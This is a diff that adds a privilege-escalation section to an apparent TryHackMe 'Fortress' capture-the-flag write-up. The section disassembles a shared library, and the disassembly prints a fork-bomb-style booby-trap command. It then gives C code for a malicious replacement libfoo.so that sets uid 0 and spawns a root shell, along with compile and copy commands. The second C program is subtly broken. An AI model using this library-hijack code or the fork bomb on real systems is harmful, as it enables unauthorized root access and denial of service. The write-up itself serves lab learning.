@@ -544,3 +544,121 @@ After that we run that binary and they give us root
 ----------------
 
 Special Thank to [A3r1t](https://tryhackme.com/p/Amrit456852) for Helping in this Room. 
+
+
+My Friend Amrit Detailed Pri-Esc Part
+
+
+# Privilage Escalation
+
+```shell-session
+j4x0n@fortress:/opt$ ldd bt
+        linux-vdso.so.1 =>  (0x00007ffc839f2000)
+        libfoo.so => /usr/lib/libfoo.so (0x00007f1e638d1000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e632f4000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f1e636be000)
+```
+
+**libfoo.so** is a shared Library which we can hijack to gain root
+
+***
+
+#### Analysing libfoo.so
+
+```shell-session
+scp -i id_rsa j4x0n@10.10.87.105:/usr/lib/libfoo.so /home/kali/Documents/fortress 
+```
+
+Analysing it uing tool ==> `r2`
+
+```shell-session
+┌──(kali㉿kali)-[~/Documents/fortress]
+└─$ r2 libfoo.so 
+Warning: run r2 with -e io.cache=true to fix relocations in disassembly
+[0x00001070]> aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Check for vtables
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x00001070]> afl
+0x00001070    4 41   -> 34   entry0
+0x00001125    1 89           sym.foo
+0x00001030    1 6            sym.imp.puts
+0x00001050    1 6            sym.imp.sleep
+0x00001040    1 6            sym.imp.system
+0x000010a0    4 57   -> 51   sym.register_tm_clones
+0x000010e0    5 57   -> 50   sym.__do_global_dtors_aux
+0x00001060    1 6            sym.imp.__cxa_finalize
+0x00001120    1 5            entry.init0
+0x00001180    1 9            sym._fini
+0x00001000    3 23           sym._init
+[0x00001070]> pdf @ sym.foo
+┌ 89: sym.foo ();
+│           0x00001125      55             push rbp
+│           0x00001126      4889e5         mov rbp, rsp
+│           0x00001129      488d3dd00e00.  lea rdi, str.Bwahaha__You_just_stepped_into_a_booby_trap_XP ; sym..rodata
+│                                                                      ; 0x2000 ; "Bwahaha, You just stepped into a booby trap XP" ; const char *s                                                                 
+│           0x00001130      e8fbfeffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00001135      bf02000000     mov edi, 2                  ; int s
+│           0x0000113a      e811ffffff     call sym.imp.sleep          ; int sleep(int s)
+│           0x0000113f      488d3dea0e00.  lea rdi, str.sleep_2__func__funcfunc_cat__dev_urandom__func ; 0x2030 ; "sleep 2 && func(){func|func& cat /dev/urandom &};func" ; const char *string
+│           0x00001146      e8f5feffff     call sym.imp.system         ; int system(const char *string)
+│           0x0000114b      488d3dde0e00.  lea rdi, str.sleep_2__func__funcfunc_cat__dev_urandom__func ; 0x2030 ; "sleep 2 && func(){func|func& cat /dev/urandom &};func" ; const char *string
+│           0x00001152      e8e9feffff     call sym.imp.system         ; int system(const char *string)
+│           0x00001157      488d3dd20e00.  lea rdi, str.sleep_2__func__funcfunc_cat__dev_urandom__func ; 0x2030 ; "sleep 2 && func(){func|func& cat /dev/urandom &};func" ; const char *string
+│           0x0000115e      e8ddfeffff     call sym.imp.system         ; int system(const char *string)
+│           0x00001163      488d3dc60e00.  lea rdi, str.sleep_2__func__funcfunc_cat__dev_urandom__func ; 0x2030 ; "sleep 2 && func(){func|func& cat /dev/urandom &};func" ; const char *string
+│           0x0000116a      e8d1feffff     call sym.imp.system         ; int system(const char *string)
+│           0x0000116f      488d3dba0e00.  lea rdi, str.sleep_2__func__funcfunc_cat__dev_urandom__func ; 0x2030 ; "sleep 2 && func(){func|func& cat /dev/urandom &};func" ; const char *string
+│           0x00001176      e8c5feffff     call sym.imp.system         ; int system(const char *string)
+│           0x0000117b      90             nop
+│           0x0000117c      5d             pop rbp
+└           0x0000117d      c3             ret
+[0x00001070]> 
+```
+
+- On analysis there is function called `foo()` which is putting some strings and sleep the program 
+
+***
+
+## Creating malicious libfoo.so
+
+**Program 1**
+```C
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h> 
+int foo() { 
+setgid(0); 
+setuid(0); 
+system("/bin/bash"); 
+}
+```
+
+**Program 2**
+
+```C
+#include<stdlib.h>
+int foo(){
+setreuid(0);
+execve("/bin/bash",NULL.NULL);
+}
+```
+
+\
+Either of the programs can be utilized
+\
+**Compile the Program**
+```shell-session
+j4x0n@fortress:~$ gcc -fPIC -shared -o libfoo.so exp.c
+```
+\
+Now **Copy** the into `/usr/lib` Since `j4x0n` is the Owner of the file `/usr/lib/libfoo.so`
+
+sudo -u j4x0n cp libfoo.so /usr/lib/libfoo.so
+```shell-session
+j4x0n@fortress:~$ sudo -u j4x0n cp libfoo.so /usr/lib/libfoo.so
+```
